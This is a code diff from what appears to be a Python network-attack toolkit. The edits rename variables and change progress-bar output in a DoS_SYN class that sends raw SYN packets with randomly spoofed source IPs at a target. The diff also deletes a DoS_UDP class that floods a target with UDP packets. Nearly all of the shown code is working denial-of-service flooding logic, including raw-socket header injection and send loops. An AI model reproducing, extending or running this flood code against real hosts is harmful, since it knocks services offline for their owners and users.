@@ -284,8 +284,8 @@ class DoS_SYN :
         return checksum
 
     def __random_ip(self) :
-        sections = [str(random.randint(1, 255)) for _ in range(0, 4)]
-        return ".".join(sections)
+        secs = [str(random.randint(1, 255)) for _ in range(0, 4)]
+        return ".".join(secs)
 
     def __prepare(self) :
         ip_header = self.__ip_header()
@@ -315,8 +315,8 @@ class DoS_SYN :
         self.rate += 32
         while self.rate % 32 != 0 :
             self.rate += 1
-        section = self.rate // 32
-        constant = section
+        sec = self.rate // 32
+        cons = sec
         try :
             for i in range(1, self.rate + 1) :
                 payload = self.__prepare()
@@ -324,57 +324,9 @@ class DoS_SYN :
                     flood.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                     flood.sendto(payload, (self.host, self.port))
                     flood.shutdown(socket.SHUT_RDWR)
-                    if i == section :
-                        print(f"[+] {self.symbol}  {section} packets sent", end = "\r", flush = True)
-                        section += constant
-                        self.symbol += chr(9608)
-            else :
-                time.sleep(2)
-                end_time = round((time.time() - start_time), 2)
-                print("\n[+] All packets have sent")
-                print(f"[-] {end_time}s")
-        except KeyboardInterrupt :
-            sys.exit(1)
-        except Exception as error :
-            print(f"[!] Error - {error or None}")
-        return
-
-
-class DoS_UDP(DoS_SYN) :
-    def __init__(self, host, port, rate, packet_size) :
-        super().__init__(host, port, rate)
-        self.packet_size = int(packet_size) if not isinstance(packet_size, int) else packet_size
-        self.payload = b""
-
-    def flood(self, module = False) :
-        try :
-            if not module :
-                print(art)
-                input("\nPress anykey to continue...\n")
-        except KeyboardInterrupt :
-            sys.exit(1)
-        with concurrent.futures.ThreadPoolExecutor() as task :
-            task.submit(self.__flood())
-        return
-
-    def __flood(self) :
-        start_time = time.time()
-        self.rate += 32
-        while self.rate % 32 != 0 :
-            self.rate += 1
-        section = self.rate // 32
-        constant = section
-        while self.packet_size > len(self.payload) :
-            self.payload += f"[HI6Cypher]".encode()
-        try :
-            for i in range(1, self.rate + 1) :
-                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as flood :
-                    flood.settimeout(60)
-                    flood.sendto(self.payload, (self.host, self.port))
-                    if i == section :
-                        print(f"[+] {self.symbol}  {section} packets sent", end = "\r", flush = True)
-                        section += constant
-                        self.symbol += chr(9608)
+                    if i == sec :
+                        print(f"[+] {(i // cons) * self.symbol}  {sec} packets sent", end = "\r", flush = True)
+                        sec += cons
             else :
                 time.sleep(2)
                 end_time = round((time.time() - start_time), 2)
@@ -440,9 +392,8 @@ class HTTP_Request :
                         break
                     else :
                         if counter != 16 :
-                            print(f"{self.symbol} Downloading", end = "\r", flush = True)
+                            print(f"{counter * self.symbol} Downloading", end = "\r", flush = True)
                             counter += 1
-                            self.symbol += chr(9608)
                             space += 2 * chr(32)
                         else :
                             print(space, end = "\r", flush = True)
